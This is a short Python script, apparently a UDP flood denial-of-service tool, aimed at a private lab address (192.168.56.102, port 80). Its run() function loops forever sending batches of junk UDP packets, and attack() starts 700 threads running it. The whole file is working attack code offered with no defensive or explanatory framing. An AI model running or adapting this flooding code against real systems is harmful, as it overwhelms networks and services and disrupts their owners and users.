import urllib
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures
import socket
import threading

target = '192.168.56.102'
port = 80

def run():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # socket.SOCK_DGRAM is for UDP
            #s.connect((target, port))
            for i in range(1000):
                s.sendto(b"UVWBOTOIHGGMFQGUJWILOAKLDRSESICXYBRYHEZJDGIDZCFSQBKVUTKVAZNZAMARXWJCUQPCXHTEDXNBEPBNTMPWCYHJLYZVFFA", (target, port))
        except:
            continue

def attack():
    for i in range(700):
        threading.Thread(target=run).start()
